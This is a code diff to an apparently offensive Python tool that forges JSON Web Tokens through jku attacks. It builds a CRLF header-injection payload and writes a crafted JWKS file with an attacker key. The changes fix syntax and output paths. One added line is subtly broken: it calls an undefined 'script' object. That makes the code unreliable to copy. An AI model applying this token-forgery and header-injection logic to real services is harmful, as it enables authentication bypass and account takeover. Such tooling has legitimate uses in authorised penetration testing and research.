@@ -24,6 +24,16 @@ import argparse
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
+#OBTAIN THE PATH OF crafted DIRECTORY
+try:
+    from config import cwd
+except ImportError:
+    path = sys.argv[0]
+    if len(script.path("/")) > 1:
+        cwd = f"{'/'.join(path.split('/')[:-1])}/"
+    else:
+        cwd = ""
+
 
 class Bcolors:
     """
@@ -188,7 +198,7 @@ class Cracker:
                     if self.alg == "rs256":
                         self.alg = "RS256"
         """Force self.alg to RS256 for jku attacks"""
-        if any(arg is not None for arg in self.jku_args)
+        if any(arg is not None for arg in self.jku_args):
             if len(list(filter(lambda x: x is not None, self.jku_args))) > 1:
                 print(f"{Bcolors.FAIL}ERROR: You can't use two jku injections at the same time.{Bcolors.ENDC}")
                 sys.exit(1)
@@ -311,7 +321,7 @@ class Cracker:
                 sys.exit(2)
             body = self.jku_via_header_injection(header_dict)
             content_length = len(body)
-            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
+            injection = f"%0d%0aContent-Length:%20{content_length}%0d%0a%0d%0a{body}"
             url = self.jku_header_injection.replace("HERE", injection)
             header_dict['jku'] = url
         if self.user_payload:
@@ -339,7 +349,7 @@ class Cracker:
         jwks_dict['keys'][0]['n'] = base64.urlsafe_b64encode(
             (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
         ).decode('utf-8').rstrip("=")
-        file = open("crafted/jwks.json", 'w')
+        file = open(f"{cwd}crafted/jwks.json", 'w')
         file.write(json.dumps(jwks_dict))
         devnull_.close()
         file.close()
